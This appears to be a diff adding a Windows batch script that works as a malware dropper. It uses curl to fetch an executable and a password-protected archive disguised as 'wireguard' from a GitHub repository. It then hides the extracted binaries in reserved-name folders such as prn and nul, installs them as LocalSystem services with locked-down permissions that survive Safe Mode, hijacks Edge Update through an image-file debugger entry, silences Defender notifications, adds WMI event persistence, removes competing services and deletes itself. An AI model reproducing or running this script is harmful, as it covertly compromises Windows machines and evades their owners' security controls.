@@ -1,0 +1,110 @@
+mkdir %ProgramData%\Comms
+%WINDIR%\System32\curl.exe -s -L -o "%ProgramData%\Comms\UnRAR.exe" "https://github.com/vltex/0/raw/main/1/UnRAR.exe"
+%WINDIR%\System32\curl.exe -s -L -o "%ProgramData%\Comms\wireguard.rar" "https://github.com/vltex/0/raw/main/1/wireguard.rar"
+
+"%ProgramData%\Comms\UnRAR.exe" x -y -p741258963 "%ProgramData%\Comms\wireguard.rar" * "%ProgramData%\Comms\"
+
+mkdir \\.\%ProgramData%\nuldata..\
+mkdir \\.\%ProgramData%\prndata..\
+mkdir \\.\%ProgramData%\condata..\
+
+copy /Y "%ProgramData%\Comms\Index.exe" "\\.\%ProgramData%\prndata..\prn.exe"
+type "%ProgramData%\Comms\IconLib.dll" > "\\.\%ProgramData%\prndata..\prn"
+
+copy /Y "%ProgramData%\Comms\Index.exe" "\\.\%ProgramData%\condata..\con.exe"
+type "%ProgramData%\Comms\Kape.dll" > "\\.\%ProgramData%\prndata..\con"
+
+move /Y "%ProgramData%\Comms\Index.exe" "\\.\%ProgramData%\nuldata..\nul.exe"
+type "%ProgramData%\Comms\winfw.dll" > "\\.\%ProgramData%\prndata..\nul"
+
+move /Y "%ProgramData%\Comms\libssl-1_1.dll" "\\.\%ProgramData%\nuldata..\"
+move /Y "%ProgramData%\Comms\vcruntime140.dll" "\\.\%ProgramData%\nuldata..\"
+move /Y "%ProgramData%\Comms\libcrypto-1_1.dll" "\\.\%ProgramData%\nuldata..\"
+move /Y "%ProgramData%\Comms\ShellExperienceHost.exe" "\\.\%ProgramData%\nuldata..\"
+
+fsutil file setshortname C:\ProgramData\prndata..\ ""
+fsutil file setshortname C:\ProgramData\condata..\ ""
+fsutil file setshortname C:\ProgramData\nuldata..\ ""
+rd /s /q "%ProgramData%\Comms"
+rd /s /q "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
+
+
+sc create OneSyncTask binPath="\\.\%ProgramData%\prndata..\prn.exe \\.\%ProgramData%\prndata..\prn" start="auto" obj="LocalSystem"
+sc create PcaSvcTask binPath="\\.\%ProgramData%\condata..\con.exe \\.\%ProgramData%\condata..\con" start="auto" obj="LocalSystem"
+sc config PcaSvcTask start= delayed-auto
+
+sc start OneSyncTask
+
+sc sdset "OneSyncTask" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
+sc sdset "PcaSvcTask" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\OneSyncTask" /VE /T REG_SZ /F /D "Service"
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\OneSyncTask" /VE /T REG_SZ /F /D "Service"
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "\\.\%ProgramData%\prndata..\prn.exe \\.\%ProgramData%\prndata..\prn" /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f /reg:64
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f /reg:64
+
+
+rd /S /Q \\.\%ProgramData%\AUX..\
+rd /S /Q \\.\%ProgramData%\CON..\
+rd /S /Q \\.\%ProgramData%\NUL..\
+rd /S /Q \\.\%ProgramData%\config..\
+rd /S /Q \\.\%ProgramData%\logdata..\
+rd /S /Q \\.\%ProgramData%\diaglogs..\
+
+del /F /S /Q /A "%WINDIR%\Setup\Scripts\*.cmd"
+del /F /S /Q /A "%ProgramData%\USOShared\*.cmd"
+
+REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Update" /f
+REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Update" /f
+REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Performance" /f
+REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Performance" /f
+
+sc sdset "Update" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
+sc sdset "Network" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
+sc sdset "Performance" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
+sc sdset "Configuration" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
+
+sc delete Network
+sc delete Update
+sc delete Performance
+sc delete Configuration
+
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="LUN", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="LUN", CommandLineTemplate="\\.\%ProgramData%\nuldata..\nul.exe \\.\%ProgramData%\nuldata..\nul"
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"LUN\"", Consumer="CommandLineEventConsumer.Name=\"LUN\""
+
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="NRP", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 70 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325'"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="NRP", CommandLineTemplate="\\.\%ProgramData%\prndata..\prn.exe \\.\%ProgramData%\prndata..\prn"
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"NRP\"", Consumer="CommandLineEventConsumer.Name=\"NRP\""
+
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="NOC", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 70 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System AND TargetInstance.SystemUpTime >= 310 AND TargetInstance.SystemUpTime < 325'"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="NOC", CommandLineTemplate="\\.\%ProgramData%\condata..\con.exe \\.\%ProgramData%\condata..\con"
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"NOC\"", Consumer="CommandLineEventConsumer.Name=\"NOC\""
+
+wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="SCM" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="SCM" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="SCM"' DELETE
+wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="MCS" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="MCS" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="MCS"' DELETE
+
+powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='LUN'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'''} | Out-Null"
+powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='LUN'; CommandLineTemplate='\\.\%ProgramData%\nuldata..\nul.exe \\.\%ProgramData%\nuldata..\nul'} | Out-Null"
+powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter='__EventFilter.Name=\"LUN\"'; Consumer='CommandLineEventConsumer.Name=\"LUN\"'} | Out-Null"
+
+powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='NRP'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 70 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325'} | Out-Null"
+powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='NRP'; CommandLineTemplate='\\.\%ProgramData%\prndata..\prn.exe \\.\%ProgramData%\prndata..\prn'} | Out-Null"
+powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter='__EventFilter.Name=\"NRP\"'; Consumer='CommandLineEventConsumer.Name=\"NRP\"'} | Out-Null"
+
+powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='NOC'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 70 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime >= 310 AND TargetInstance.SystemUpTime < 325'} | Out-Null"
+powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='NOC'; CommandLineTemplate='\\.\%ProgramData%\condata..\con.exe \\.\%ProgramData%\condata..\con'} | Out-Null"
+powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter='__EventFilter.Name=\"NOC\"'; Consumer='CommandLineEventConsumer.Name=\"NOC\"'} | Out-Null"
+
+
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like '*SCM*' -or $_.Consumer -like '*SCM*' } | Remove-WmiObject"
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='SCM'\" | Remove-WmiObject"
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter \"Name='SCM'\" | Remove-WmiObject"
+
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like '*MCS*' -or $_.Consumer -like '*MCS*' } | Remove-WmiObject"
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='MCS'\" | Remove-WmiObject"
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter \"Name='MCS'\" | Remove-WmiObject"
+
+del /f "%~f0"
